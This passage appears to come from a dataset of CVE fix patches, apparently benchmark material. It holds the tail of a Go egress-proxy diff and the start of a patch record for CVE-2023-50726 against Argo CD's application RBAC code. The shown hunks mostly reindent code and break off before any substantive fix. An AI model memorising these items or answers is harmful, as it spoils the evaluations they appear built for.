time.Second\n-\t\t}\n-\n-\t\tctx, cancel := context.WithTimeout(context.Background(), timeout)\n-\t\tdefer cancel()\n-\n-\t\terr := server.Shutdown(ctx)\n-\t\tif err != nil {\n-\t\t\tconfig.Log.Errorf(\"error shutting down http server: %v\", err)\n-\t\t}\n-\t}()\n-\n-\tif err := server.Serve(listener); err != http.ErrServerClosed {\n-\t\tconfig.Log.Errorf(\"http serve error: %v\", err)\n-\t}\n-\n-\tif graceful {\n-\t\t// Wait for all connections to close or become idle before\n-\t\t// continuing in an attempt to shutdown gracefully.\n-\t\texit := make(chan ExitStatus, 1)\n-\n-\t\t// This subroutine blocks until all connections close.\n-\t\tgo func() {\n-\t\t\tconfig.Log.Print(\"Waiting for all connections to close...\")\n-\t\t\tconfig.ConnTracker.Wg.Wait()\n-\t\t\tconfig.Log.Print(\"All connections are closed. Continuing with shutdown...\")\n-\t\t\texit <- Closed\n-\t\t}()\n-\n-\t\t// Always wait for a maximum of config.ExitTimeout\n-\t\ttime.AfterFunc(config.ExitTimeout, func() {\n-\t\t\tconfig.Log.Printf(\"ExitTimeout %v reached - timing out\", config.ExitTimeout)\n-\t\t\texit <- Timeout\n-\t\t})\n-\n-\t\t// Sometimes, connections don't close and remain in the idle state. This subroutine\n-\t\t// waits until all open connections are idle before sending the exit signal.\n-\t\tgo func() {\n-\t\t\tconfig.Log.Print(\"Waiting for all connections to become idle...\")\n-\t\t\tbeginTs := time.Now()\n-\n-\t\t\t// If idleTimeout is set to 0, fall back to using the exit timeout to avoid\n-\t\t\t// immediately closing active connections.\n-\t\t\tidleTimeout := config.IdleTimeout\n-\t\t\tif idleTimeout == 0 {\n-\t\t\t\tidleTimeout = config.ExitTimeout\n-\t\t\t}\n-\n-\t\t\tfor {\n-\t\t\t\tcheckAgainIn := config.ConnTracker.MaybeIdleIn(idleTimeout)\n-\t\t\t\tif checkAgainIn > 0 {\n-\t\t\t\t\tif time.Since(beginTs) > config.ExitTimeout {\n-\t\t\t\t\t\tconfig.Log.Print(fmt.Sprintf(\"Timed out at %v while waiting for all open connections to become idle.\", config.ExitTimeout))\n-\t\t\t\t\t\texit <- Timeout\n-\t\t\t\t\t\tbreak\n-\t\t\t\t\t} else {\n-\t\t\t\t\t\tconfig.Log.Print(fmt.Sprintf(\"There are still active connections. Waiting %v before checking again.\", checkAgainIn))\n-\t\t\t\t\t\ttime.Sleep(checkAgainIn)\n-\t\t\t\t\t}\n-\t\t\t\t} else {\n-\t\t\t\t\tconfig.Log.Print(\"All connections are idle. Continuing with shutdown...\")\n-\t\t\t\t\texit <- Idle\n-\t\t\t\t\tbreak\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}()\n-\n-\t\t// Wait for the exit signal.\n-\t\treason := <-exit\n-\t\tconfig.Log.Print(fmt.Sprintf(\"%s: closing all remaining connections.\", reason.String()))\n-\t}\n-\n-\t// Close all open (and idle) connections to send their metrics to log.\n-\tconfig.ConnTracker.Range(func(k, v interface{}) bool {\n-\t\tk.(*conntrack.InstrumentedConn).Close()\n-\t\treturn true\n-\t})\n-\n-\tif config.StatsServer != nil {\n-\t\tconfig.StatsServer.Shutdown()\n-\t}\n+        // Runs the server and shuts it down when it receives a signal.\n+        //\n+        // Why aren't we using goji's graceful shutdown library? Great question!\n+        //\n+        // There are several things we might want to do when shutting down gracefully:\n+        // 1. close the listening socket (so that we don't accept *new* connections)\n+        // 2. close *existing* keepalive connections once they become idle\n+        //\n+        // goproxy hijacks the socket and interferes with goji's ability to do the\n+        // latter.  We instead pass InstrumentedConn objects, which wrap net.Conn,\n+        // into goproxy.  ConnTracker keeps a reference to these, which allows us to\n+        // know exactly how long to wait until the connection has become idle, and\n+        // then Close it.\n+\n+        if len(config.StatsSocketDir) > 0 {\n+                config.StatsServer = StartStatsServer(config)\n+        }\n+\n+        graceful := true\n+        kill := make(chan os.Signal, 1)\n+        signal.Notify(kill, syscall.SIGUSR2, syscall.SIGTERM, syscall.SIGHUP)\n+        go func() {\n+                select {\n+                case <-kill:\n+                        config.Log.Print(\"quitting gracefully\")\n+\n+                case <-quit:\n+                        config.Log.Print(\"quitting now\")\n+                        graceful = false\n+                }\n+                config.ShuttingDown.Store(true)\n+\n+                // Shutdown() will block until all connections are closed unless we\n+                // provide it with a cancellation context.\n+                timeout := config.ExitTimeout\n+                if !graceful {\n+                        timeout = 10 * time.Second\n+                }\n+\n+                ctx, cancel := context.WithTimeout(context.Background(), timeout)\n+                defer cancel()\n+\n+                err := server.Shutdown(ctx)\n+                if err != nil {\n+                        config.Log.Errorf(\"error shutting down http server: %v\", err)\n+                }\n+        }()\n+\n+        if err := server.Serve(listener); err != http.ErrServerClosed {\n+                config.Log.Errorf(\"http serve error: %v\", err)\n+        }\n+\n+        if graceful {\n+                // Wait for all connections to close or become idle before\n+                // continuing in an attempt to shutdown gracefully.\n+                exit := make(chan ExitStatus, 1)\n+\n+                // This subroutine blocks until all connections close.\n+                go func() {\n+                        config.Log.Print(\"Waiting for all connections to close...\")\n+                        config.ConnTracker.Wg.Wait()\n+                        config.Log.Print(\"All connections are closed. Continuing with shutdown...\")\n+                        exit <- Closed\n+                }()\n+\n+                // Always wait for a maximum of config.ExitTimeout\n+                time.AfterFunc(config.ExitTimeout, func() {\n+                        config.Log.Printf(\"ExitTimeout %v reached - timing out\", config.ExitTimeout)\n+                        exit <- Timeout\n+                })\n+\n+                // Sometimes, connections don't close and remain in the idle state. This subroutine\n+                // waits until all open connections are idle before sending the exit signal.\n+                go func() {\n+                        config.Log.Print(\"Waiting for all connections to become idle...\")\n+                        beginTs := time.Now()\n+\n+                        // If idleTimeout is set to 0, fall back to using the exit timeout to avoid\n+                        // immediately closing active connections.\n+                        idleTimeout := config.IdleTimeout\n+                        if idleTimeout == 0 {\n+                                idleTimeout = config.ExitTimeout\n+                        }\n+\n+                        for {\n+                                checkAgainIn := config.ConnTracker.MaybeIdleIn(idleTimeout)\n+                                if checkAgainIn > 0 {\n+                                        if time.Since(beginTs) > config.ExitTimeout {\n+                                                config.Log.Print(fmt.Sprintf(\"Timed out at %v while waiting for all open connections to become idle.\", config.ExitTimeout))\n+                                                exit <- Timeout\n+                                                break\n+                                        } else {\n+                                                config.Log.Print(fmt.Sprintf(\"There are still active connections. Waiting %v before checking again.\", checkAgainIn))\n+                                                time.Sleep(checkAgainIn)\n+                                        }\n+                                } else {\n+                                        config.Log.Print(\"All connections are idle. Continuing with shutdown...\")\n+                                        exit <- Idle\n+                                        break\n+                                }\n+                        }\n+                }()\n+\n+                // Wait for the exit signal.\n+                reason := <-exit\n+                config.Log.Print(fmt.Sprintf(\"%s: closing all remaining connections.\", reason.String()))\n+        }\n+\n+        // Close all open (and idle) connections to send their metrics to log.\n+        config.ConnTracker.Range(func(k, v interface{}) bool {\n+                k.(*conntrack.InstrumentedConn).Close()\n+                return true\n+        })\n+\n+        if config.StatsServer != nil {\n+                config.StatsServer.Shutdown()\n+        }\n }\n \n // Extract the client's ACL role from the HTTP request, using the configured\n@@ -801,119 +807,119 @@ func runServer(config *Config, server *http.Server, listener net.Listener, quit\n // AllowMissingRole is configured, in which case an empty role and no error is\n // returned.\n func getRole(config *Config, req *http.Request) (string, error) {\n-\tvar role string\n-\tvar err error\n-\n-\tif config.RoleFromRequest != nil {\n-\t\trole, err = config.RoleFromRequest(req)\n-\t} else {\n-\t\terr = MissingRoleError(\"RoleFromRequest is not configured\")\n-\t}\n-\n-\tswitch {\n-\tcase err == nil:\n-\t\treturn role, nil\n-\tcase IsMissingRoleError(err) && config.AllowMissingRole:\n-\t\treturn \"\", nil\n-\tdefault:\n-\t\tconfig.Log.WithFields(logrus.Fields{\n-\t\t\t\"error\":              err,\n-\t\t\t\"is_missing_role\":    IsMissingRoleError(err),\n-\t\t\t\"allow_missing_role\": config.AllowMissingRole,\n-\t\t}).Error(\"Unable to get role for request\")\n-\t\treturn \"\", err\n-\t}\n+        var role string\n+        var err error\n+\n+        if config.RoleFromRequest != nil {\n+                role, err = config.RoleFromRequest(req)\n+        } else {\n+                err = MissingRoleError(\"RoleFromRequest is not configured\")\n+        }\n+\n+        switch {\n+        case err == nil:\n+                return role, nil\n+        case IsMissingRoleError(err) && config.AllowMissingRole:\n+                return \"\", nil\n+        default:\n+                config.Log.WithFields(logrus.Fields{\n+                        \"error\":              err,\n+                        \"is_missing_role\":    IsMissingRoleError(err),\n+                        \"allow_missing_role\": config.AllowMissingRole,\n+                }).Error(\"Unable to get role for request\")\n+                return \"\", err\n+        }\n }\n \n func checkIfRequestShouldBeProxied(config *Config, req *http.Request, outboundHost string) (*aclDecision, time.Duration, error) {\n-\tdecision := checkACLsForRequest(config, req, outboundHost)\n-\n-\tvar lookupTime time.Duration\n-\tif decision.allow {\n-\t\tstart := time.Now()\n-\t\tresolved, reason, err := safeResolve(config, \"tcp\", outboundHost)\n-\t\tlookupTime = time.Since(start)\n-\t\tif err != nil {\n-\t\t\tif _, ok := err.(denyError); !ok {\n-\t\t\t\treturn decision, lookupTime, err\n-\t\t\t}\n-\t\t\tdecision.reason = fmt.Sprintf(\"%s. %s\", err.Error(), reason)\n-\t\t\tdecision.allow = false\n-\t\t\tdecision.enforceWouldDeny = true\n-\t\t} else {\n-\t\t\tdecision.resolvedAddr = resolved\n-\t\t}\n-\t}\n-\n-\treturn decision, lookupTime, nil\n+        decision := checkACLsForRequest(config, req, outboundHost)\n+\n+        var lookupTime time.Duration\n+        if decision.allow {\n+                start := time.Now()\n+                resolved, reason, err := safeResolve(config, \"tcp\", outboundHost)\n+                lookupTime = time.Since(start)\n+                if err != nil {\n+                        if _, ok := err.(denyError); !ok {\n+                                return decision, lookupTime, err\n+                        }\n+                        decision.reason = fmt.Sprintf(\"%s. %s\", err.Error(), reason)\n+                        decision.allow = false\n+                        decision.enforceWouldDeny = true\n+                } else {\n+                        decision.resolvedAddr = resolved\n+                }\n+        }\n+\n+        return decision, lookupTime, nil\n }\n \n func checkACLsForRequest(config *Config, req *http.Request, outboundHost string) *aclDecision {\n-\tdecision := &aclDecision{\n-\t\toutboundHost: outboundHost,\n-\t}\n-\n-\tif config.EgressACL == nil {\n-\t\tdecision.allow = true\n-\t\tdecision.reason = \"Egress ACL is not configured\"\n-\t\treturn decision\n-\t}\n-\n-\trole, roleErr := getRole(config, req)\n-\tif roleErr != nil {\n-\t\tconfig.MetricsClient.Incr(\"acl.role_not_determined\", 1)\n-\t\tdecision.reason = \"Client role cannot be determined\"\n-\t\treturn decision\n-\t}\n-\n-\tdecision.role = role\n-\n-\tsubmatch := hostExtractRE.FindStringSubmatch(outboundHost)\n-\tdestination := submatch[1]\n-\n-\taclDecision, err := config.EgressACL.Decide(role, destination)\n-\tdecision.project = aclDecision.Project\n-\tdecision.reason = aclDecision.Reason\n-\tif err != nil {\n-\t\tconfig.Log.WithFields(logrus.Fields{\n-\t\t\t\"error\": err,\n-\t\t\t\"role\":  role,\n-\t\t}).Warn(\"EgressAcl.Decide returned an error.\")\n-\n-\t\tconfig.MetricsClient.Incr(\"acl.decide_error\", 1)\n-\t\treturn decision\n-\t}\n-\n-\ttags := []string{\n-\t\tfmt.Sprintf(\"role:%s\", decision.role),\n-\t\tfmt.Sprintf(\"def_rule:%t\", aclDecision.Default),\n-\t\tfmt.Sprintf(\"project:%s\", aclDecision.Project),\n-\t}\n-\n-\tswitch aclDecision.Result {\n-\tcase acl.Deny:\n-\t\tdecision.enforceWouldDeny = true\n-\t\tconfig.MetricsClient.IncrWithTags(\"acl.deny\", tags, 1)\n-\n-\tcase acl.AllowAndReport:\n-\t\tdecision.enforceWouldDeny = true\n-\t\tconfig.MetricsClient.IncrWithTags(\"acl.report\", tags, 1)\n-\t\tdecision.allow = true\n-\n-\tcase acl.Allow:\n-\t\t// Well, everything is going as expected.\n-\t\tdecision.allow = true\n-\t\tdecision.enforceWouldDeny = false\n-\t\tconfig.MetricsClient.IncrWithTags(\"acl.allow\", tags, 1)\n-\tdefault:\n-\t\tconfig.Log.WithFields(logrus.Fields{\n-\t\t\t\"role\":        role,\n-\t\t\t\"destination\": destination,\n-\t\t\t\"action\":      aclDecision.Result.String(),\n-\t\t}).Warn(\"Unknown ACL action\")\n-\t\tdecision.reason = \"Internal error\"\n-\t\tconfig.MetricsClient.IncrWithTags(\"acl.unknown_error\", tags, 1)\n-\t}\n-\n-\treturn decision\n+        decision := &aclDecision{\n+                outboundHost: outboundHost,\n+        }\n+\n+        if config.EgressACL == nil {\n+                decision.allow = true\n+                decision.reason = \"Egress ACL is not configured\"\n+                return decision\n+        }\n+\n+        role, roleErr := getRole(config, req)\n+        if roleErr != nil {\n+                config.MetricsClient.Incr(\"acl.role_not_determined\", 1)\n+                decision.reason = \"Client role cannot be determined\"\n+                return decision\n+        }\n+\n+        decision.role = role\n+\n+        submatch := hostExtractRE.FindStringSubmatch(outboundHost)\n+        destination := submatch[1]\n+\n+        aclDecision, err := config.EgressACL.Decide(role, destination)\n+        decision.project = aclDecision.Project\n+        decision.reason = aclDecision.Reason\n+        if err != nil {\n+                config.Log.WithFields(logrus.Fields{\n+                        \"error\": err,\n+                        \"role\":  role,\n+                }).Warn(\"EgressAcl.Decide returned an error.\")\n+\n+                config.MetricsClient.Incr(\"acl.decide_error\", 1)\n+                return decision\n+        }\n+\n+        tags := []string{\n+                fmt.Sprintf(\"role:%s\", decision.role),\n+                fmt.Sprintf(\"def_rule:%t\", aclDecision.Default),\n+                fmt.Sprintf(\"project:%s\", aclDecision.Project),\n+        }\n+\n+        switch aclDecision.Result {\n+        case acl.Deny:\n+                decision.enforceWouldDeny = true\n+                config.MetricsClient.IncrWithTags(\"acl.deny\", tags, 1)\n+\n+        case acl.AllowAndReport:\n+                decision.enforceWouldDeny = true\n+                config.MetricsClient.IncrWithTags(\"acl.report\", tags, 1)\n+                decision.allow = true\n+\n+        case acl.Allow:\n+                // Well, everything is going as expected.\n+                decision.allow = true\n+                decision.enforceWouldDeny = false\n+                config.MetricsClient.IncrWithTags(\"acl.allow\", tags, 1)\n+        default:\n+                config.Log.WithFields(logrus.Fields{\n+                        \"role\":        role,\n+                        \"destination\": destination,\n+                        \"action\":      aclDecision.Result.String(),\n+                }).Warn(\"Unknown ACL action\")\n+                decision.reason = \"Internal error\"\n+                config.MetricsClient.IncrWithTags(\"acl.unknown_error\", tags, 1)\n+        }\n+\n+        return decision\n }\n"}
{"cve":"CVE-2023-50726:0708", "fix_patch": "diff --git a/server/application/application.go b/server/application/application.go\nindex 8ee16b934..06c795ae3 100644\n--- a/server/application/application.go\n+++ b/server/application/application.go\n@@ -1,144 +1,144 @@\n package application\n \n import (\n-\t\"context\"\n-\t\"encoding/json\"\n-\t\"errors\"\n-\t\"fmt\"\n-\t\"math\"\n-\t\"reflect\"\n-\t\"sort\"\n-\t\"strconv\"\n-\t\"strings\"\n-\t\"time\"\n-\n-\tkubecache \"github.com/argoproj/gitops-engine/pkg/cache\"\n-\t\"github.com/argoproj/gitops-engine/pkg/diff\"\n-\t\"github.com/argoproj/gitops-engine/pkg/sync/common\"\n-\t\"github.com/argoproj/gitops-engine/pkg/utils/kube\"\n-\t\"github.com/argoproj/gitops-engine/pkg/utils/text\"\n-\t\"github.com/argoproj/pkg/sync\"\n-\tjsonpatch \"github.com/evanphx/json-patch\"\n-\tlog \"github.com/sirupsen/logrus\"\n-\t\"google.golang.org/grpc/codes\"\n-\t\"google.golang.org/grpc/status\"\n-\tv1 \"k8s.io/api/core/v1\"\n-\tapierr \"k8s.io/apimachinery/pkg/api/errors\"\n-\tmetav1 \"k8s.io/apimachinery/pkg/apis/meta/v1\"\n-\t\"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured\"\n-\t\"k8s.io/apimachinery/pkg/fields\"\n-\t\"k8s.io/apimachinery/pkg/labels\"\n-\t\"k8s.io/apimachinery/pkg/runtime/schema\"\n-\t\"k8s.io/apimachinery/pkg/types\"\n-\t\"k8s.io/apimachinery/pkg/watch\"\n-\t\"k8s.io/client-go/kubernetes\"\n-\t\"k8s.io/client-go/rest\"\n-\t\"k8s.io/client-go/tools/cache\"\n-\t\"k8s.io/utils/pointer\"\n-\n-\targocommon \"github.com/argoproj/argo-cd/v2/common\"\n-\t\"github.com/argoproj/argo-cd/v2/pkg/apiclient/application\"\n-\tappv1 \"github.com/argoproj/argo-cd/v2/pkg/apis/application/v1alpha1\"\n-\tappclientset \"github.com/argoproj/argo-cd/v2/pkg/client/clientset/versioned\"\n-\tapplisters \"github.com/argoproj/argo-cd/v2/pkg/client/listers/application/v1alpha1\"\n-\t\"github.com/argoproj/argo-cd/v2/reposerver/apiclient\"\n-\tservercache \"github.com/argoproj/argo-cd/v2/server/cache\"\n-\t\"github.com/argoproj/argo-cd/v2/server/deeplinks\"\n-\t\"github.com/argoproj/argo-cd/v2/server/rbacpolicy\"\n-\t\"github.com/argoproj/argo-cd/v2/util/argo\"\n-\targoutil \"github.com/argoproj/argo-cd/v2/util/argo\"\n-\t\"github.com/argoproj/argo-cd/v2/util/collections\"\n-\t\"github.com/argoproj/argo-cd/v2/util/db\"\n-\t\"github.com/argoproj/argo-cd/v2/util/env\"\n-\t\"github.com/argoproj/argo-cd/v2/util/git\"\n-\tioutil \"github.com/argoproj/argo-cd/v2/util/io\"\n-\t\"github.com/argoproj/argo-cd/v2/util/lua\"\n-\t\"github.com/argoproj/argo-cd/v2/util/manifeststream\"\n-\t\"github.com/argoproj/argo-cd/v2/util/rbac\"\n-\t\"github.com/argoproj/argo-cd/v2/util/security\"\n-\t\"github.com/argoproj/argo-cd/v2/util/session\"\n-\t\"github.com/argoproj/argo-cd/v2/util/settings\"\n-\n-\tapplicationType \"github.com/argoproj/argo-cd/v2/pkg/apis/application\"\n+        \"context\"\n+        \"encoding/json\"\n+        \"errors\"\n+        \"fmt\"\n+        \"math\"\n+        \"reflect\"\n+        \"sort\"\n+        \"strconv\"\n+        \"strings\"\n+        \"time\"\n+\n+        kubecache \"github.com/argoproj/gitops-engine/pkg/cache\"\n+        \"github.com/argoproj/gitops-engine/pkg/diff\"\n+        \"github.com/argoproj/gitops-engine/pkg/sync/common\"\n+        \"github.com/argoproj/gitops-engine/pkg/utils/kube\"\n+        \"github.com/argoproj/gitops-engine/pkg/utils/text\"\n+        \"github.com/argoproj/pkg/sync\"\n+        jsonpatch \"github.com/evanphx/json-patch\"\n+        log \"github.com/sirupsen/logrus\"\n+        \"google.golang.org/grpc/codes\"\n+        \"google.golang.org/grpc/status\"\n+        v1 \"k8s.io/api/core/v1\"\n+        apierr \"k8s.io/apimachinery/pkg/api/errors\"\n+        metav1 \"k8s.io/apimachinery/pkg/apis/meta/v1\"\n+        \"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured\"\n+        \"k8s.io/apimachinery/pkg/fields\"\n+        \"k8s.io/apimachinery/pkg/labels\"\n+        \"k8s.io/apimachinery/pkg/runtime/schema\"\n+        \"k8s.io/apimachinery/pkg/types\"\n+        \"k8s.io/apimachinery/pkg/watch\"\n+        \"k8s.io/client-go/kubernetes\"\n+        \"k8s.io/client-go/rest\"\n+        \"k8s.io/client-go/tools/cache\"\n+        \"k8s.io/utils/pointer\"\n+\n+        argocommon \"github.com/argoproj/argo-cd/v2/common\"\n+        \"github.com/argoproj/argo-cd/v2/pkg/apiclient/application\"\n+        appv1 \"github.com/argoproj/argo-cd/v2/pkg/apis/application/v1alpha1\"\n+        appclientset \"github.com/argoproj/argo-cd/v2/pkg/client/clientset/versioned\"\n+        applisters \"github.com/argoproj/argo-cd/v2/pkg/client/listers/application/v1alpha1\"\n+        \"github.com/argoproj/argo-cd/v2/reposerver/apiclient\"\n+        servercache \"github.com/argoproj/argo-cd/v2/server/cache\"\n+        \"github.com/argoproj/argo-cd/v2/server/deeplinks\"\n+        \"github.com/argoproj/argo-cd/v2/server/rbacpolicy\"\n+        \"github.com/argoproj/argo-cd/v2/util/argo\"\n+        argoutil \"github.com/argoproj/argo-cd/v2/util/argo\"\n+        \"github.com/argoproj/argo-cd/v2/util/collections\"\n+        \"github.com/argoproj/argo-cd/v2/util/db\"\n+        \"github.com/argoproj/argo-cd/v2/util/env\"\n+        \"github.com/argoproj/argo-cd/v2/util/git\"\n+        ioutil \"github.com/argoproj/argo-cd/v2/util/io\"\n+        \"github.com/argoproj/argo-cd/v2/util/lua\"\n+        \"github.com/argoproj/argo-cd/v2/util/manifeststream\"\n+        \"github.com/argoproj/argo-cd/v2/util/rbac\"\n+        \"github.com/argoproj/argo-cd/v2/util/security\"\n+        \"github.com/argoproj/argo-cd/v2/util/session\"\n+        \"github.com/argoproj/argo-cd/v2/util/settings\"\n+\n+        applicationType \"github.com/argoproj/argo-cd/v2/pkg/apis/application\"\n )\n \n type AppResourceTreeFn func(ctx context.Context, app *appv1.Application) (*appv1.ApplicationTree, error)\n \n const (\n-\tmaxPodLogsToRender                 = 10\n-\tbackgroundPropagationPolicy string = \"background\"\n-\tforegroundPropagationPolicy string = \"foreground\"\n+        maxPodLogsToRender                 = 10\n+        backgroundPropagationPolicy string = \"background\"\n+        foregroundPropagationPolicy string = \"foreground\"\n )\n \n var (\n-\twatchAPIBufferSize  = env.ParseNumFromEnv(argocommon.EnvWatchAPIBufferSize, 1000, 0, math.MaxInt32)\n-\tpermissionDeniedErr = status.Error(codes.PermissionDenied, \"permission denied\")\n+        watchAPIBufferSize  = env.ParseNumFromEnv(argocommon.EnvWatchAPIBufferSize, 1000, 0, math.MaxInt32)\n+        permissionDeniedErr = status.Error(codes.PermissionDenied, \"permission denied\")\n )\n \n // Server provides an Application service\n type Server struct {\n-\tns                string\n-\tkubeclientset     kubernetes.Interface\n-\tappclientset      appclientset.Interface\n-\tappLister         applisters.ApplicationLister\n-\tappInformer       cache.SharedIndexInformer\n-\tappBroadcaster    Broadcaster\n-\trepoClientset     apiclient.Clientset\n-\tkubectl           kube.Kubectl\n-\tdb                db.ArgoDB\n-\tenf               *rbac.Enforcer\n-\tprojectLock       sync.KeyLock\n-\tauditLogger       *argo.AuditLogger\n-\tsettingsMgr       *settings.SettingsManager\n-\tcache             *servercache.Cache\n-\tprojInformer      cache.SharedIndexInformer\n-\tenabledNamespaces []string\n+        ns                string\n+        kubeclientset     kubernetes.Interface\n+        appclientset      appclientset.Interface\n+        appLister         applisters.ApplicationLister\n+        appInformer       cache.SharedIndexInformer\n+        appBroadcaster    Broadcaster\n+        repoClientset     apiclient.Clientset\n+        kubectl           kube.Kubectl\n+        db                db.ArgoDB\n+        enf               *rbac.Enforcer\n+        projectLock       sync.KeyLock\n+        auditLogger       *argo.AuditLogger\n+        settingsMgr       *settings.SettingsManager\n+        cache             *servercache.Cache\n+        projInformer      cache.SharedIndexInformer\n+        enabledNamespaces []string\n }\n \n // NewServer returns a new instance of the Application service\n func NewServer(\n-\tnamespace string,\n-\tkubeclientset kubernetes.Interface,\n-\tappclientset appclientset.Interface,\n-\tappLister applisters.ApplicationLister,\n-\tappInformer cache.SharedIndexInformer,\n-\tappBroadcaster Broadcaster,\n-\trepoClientset apiclient.Clientset,\n-\tcache *servercache.Cache,\n-\tkubectl kube.Kubectl,\n-\tdb db.ArgoDB,\n-\tenf *rbac.Enforcer,\n-\tprojectLock sync.KeyLock,\n-\tsettingsMgr *settings.SettingsManager,\n-\tprojInformer cache.SharedIndexInformer,\n-\tenabledNamespaces []string,\n+        namespace string,\n+        kubeclientset kubernetes.Interface,\n+        appclientset appclientset.Interface,\n+        appLister applisters.ApplicationLister,\n+        appInformer cache.SharedIndexInformer,\n+        appBroadcaster Broadcaster,\n+        repoClientset apiclient.Clientset,\n+        cache *servercache.Cache,\n+        kubectl kube.Kubectl,\n+        db db.ArgoDB,\n+        enf *rbac.Enforcer,\n+        projectLock sync.KeyLock,\n+        settingsMgr *settings.SettingsManager,\n+        projInformer cache.SharedIndexInformer,\n+        enabledNamespaces []string,\n ) (application.ApplicationServiceServer, AppResourceTreeFn) {\n-\tif appBroadcaster == nil {\n-\t\tappBroadcaster = &broadcasterHandler{}\n-\t}\n-\t_, err := appInformer.AddEventHandler(appBroadcaster)\n-\tif err != nil {\n-\t\tlog.Error(err)\n-\t}\n-\ts := &Server{\n-\t\tns:                namespace,\n-\t\tappclientset:      appclientset,\n-\t\tappLister:         appLister,\n-\t\tappInformer:       appInformer,\n-\t\tappBroadcaster:    appBroadcaster,\n-\t\tkubeclientset:     kubeclientset,\n-\t\tcache:             cache,\n-\t\tdb:                db,\n-\t\trepoClientset:     repoClientset,\n-\t\tkubectl:           kubectl,\n-\t\tenf:               enf,\n-\t\tprojectLock:       projectLock,\n-\t\tauditLogger:       argo.NewAuditLogger(namespace, kubeclientset, \"argocd-server\"),\n-\t\tsettingsMgr:       settingsMgr,\n-\t\tprojInformer:      projInformer,\n-\t\tenabledNamespaces: enabledNamespaces,\n-\t}\n-\treturn s, s.getAppResources\n+        if appBroadcaster == nil {\n+                appBroadcaster = &broadcasterHandler{}\n+        }\n+        _, err := appInformer.AddEventHandler(appBroadcaster)\n+        if err != nil {\n+                log.Error(err)\n+        }\n+        s := &Server{\n+                ns:                namespace,\n+                appclientset:      appclientset,\n+                appLister:         appLister,\n+                appInformer:       appInformer,\n+                appBroadcaster:    appBroadcaster,\n+                kubeclientset:     kubeclientset,\n+                cache:             cache,\n+                db:                db,\n+                repoClientset:     repoClientset,\n+                kubectl:           kubectl,\n+                enf:               enf,\n+                projectLock:       projectLock,\n+                auditLogger:       argo.NewAuditLogger(namespace, kubeclientset, \"argocd-server\"),\n+                settingsMgr:       settingsMgr,\n+                projInformer:      projInformer,\n+                enabledNamespaces: enabledNamespaces,\n+        }\n+        return s, s.getAppResources\n }\n \n // getAppEnforceRBAC gets the Application with the given name in the given namespace. If no namespace is\n@@ -152,679 +152,684 @@ func NewServer(\n // If the user does provide a \"project,\" we can respond more specifically. If the user does not have access to the given\n // app name in the given project, we return \"permission denied.\" If the app exists, but the project is different from\n func (s *Server) getAppEnforceRBAC(ctx context.Context, action, project, namespace, name string, getApp func() (*appv1.Application, error)) (*appv1.Application, error) {\n-\tuser := session.Username(ctx)\n-\tif user == \"\" {\n-\t\tuser = \"Unknown user\"\n-\t}\n-\tlogCtx := log.WithFields(map[string]interface{}{\n-\t\t\"user\":        user,\n-\t\t\"application\": name,\n-\t\t\"namespace\":   namespace,\n-\t})\n-\tif project != \"\" {\n-\t\t// The user has provided everything we need to perform an initial RBAC check.\n-\t\tgivenRBACName := security.RBACName(s.ns, project, namespace, name)\n-\t\tif err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceApplications, action, givenRBACName); err != nil {\n-\t\t\tlogCtx.WithFields(map[string]interface{}{\n-\t\t\t\t\"project\":                project,\n-\t\t\t\targocommon.SecurityField: argocommon.SecurityMedium,\n-\t\t\t}).Warnf(\"user tried to %s application which they do not have access to: %s\", action, err)\n-\t\t\t// Do a GET on the app. This ensures that the timing of a \"no access\" response is the same as a \"yes access,\n-\t\t\t// but the app is in a different project\" response. We don't want the user inferring the existence of the\n-\t\t\t// app from response time.\n-\t\t\t_, _ = getApp()\n-\t\t\treturn nil, permissionDeniedErr\n-\t\t}\n-\t}\n-\ta, err := getApp()\n-\tif err != nil {\n-\t\tif apierr.IsNotFound(err) {\n-\t\t\tif project != \"\" {\n-\t\t\t\t// We know that the user was allowed to get the Application, but the Application does not exist. Return 404.\n-\t\t\t\treturn nil, status.Errorf(codes.NotFound, apierr.NewNotFound(schema.GroupResource{Group: \"argoproj.io\", Resource: \"applications\"}, name).Error())\n-\t\t\t}\n-\t\t\t// We don't know if the user was allowed to get the Application, and we don't want to leak information about\n-\t\t\t// the Application's existence. Return 403.\n-\t\t\tlogCtx.Warn(\"application does not exist\")\n-\t\t\treturn nil, permissionDeniedErr\n-\t\t}\n-\t\tlogCtx.Errorf(\"failed to get application: %s\", err)\n-\t\treturn nil, permissionDeniedErr\n-\t}\n-\t// Even if we performed an initial RBAC check (because the request was fully parameterized), we still need to\n-\t// perform a second RBAC check to ensure that the user has access to the actual Application's project (not just the\n-\t// project they specified in the request).\n-\tif err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceApplications, action, a.RBACName(s.ns)); err != nil {\n-\t\tlogCtx.WithFields(map[string]interface{}{\n-\t\t\t\"project\":                a.Spec.Project,\n-\t\t\targocommon.SecurityField: argocommon.SecurityMedium,\n-\t\t}).Warnf(\"user tried to %s application which they do not have access to: %s\", action, err)\n-\t\tif project != \"\" {\n-\t\t\t// The user specified a project. We would have returned a 404 if the user had access to the app, but the app\n-\t\t\t// did not exist. So we have to return a 404 when the app does exist, but the user does not have access.\n-\t\t\t// Otherwise, they could infer that the app exists based on the error code.\n-\t\t\treturn nil, status.Errorf(codes.NotFound, apierr.NewNotFound(schema.GroupResource{Group: \"argoproj.io\", Resource: \"applications\"}, name).Error())\n-\t\t}\n-\t\t// The user didn't specify a project. We always return permission denied for both lack of access and lack of\n-\t\t// existence.\n-\t\treturn nil, permissionDeniedErr\n-\t}\n-\teffectiveProject := \"default\"\n-\tif a.Spec.Project != \"\" {\n-\t\teffectiveProject = a.Spec.Project\n-\t}\n-\tif project != \"\" && effectiveProject != project {\n-\t\tlogCtx.WithFields(map[string]interface{}{\n-\t\t\t\"project\":                a.Spec.Project,\n-\t\t\targocommon.SecurityField: argocommon.SecurityMedium,\n-\t\t}).Warnf(\"user tried to %s application in project %s, but the application is in project %s\", action, project, effectiveProject)\n-\t\t// The user has access to the app, but the app is in a different project. Return 404, meaning \"app doesn't\n-\t\t// exist in that project\".\n-\t\treturn nil, status.Errorf(codes.NotFound, apierr.NewNotFound(schema.GroupResource{Group: \"argoproj.io\", Resource: \"applications\"}, name).Error())\n-\t}\n-\treturn a, nil\n+        user := session.Username(ctx)\n+        if user == \"\" 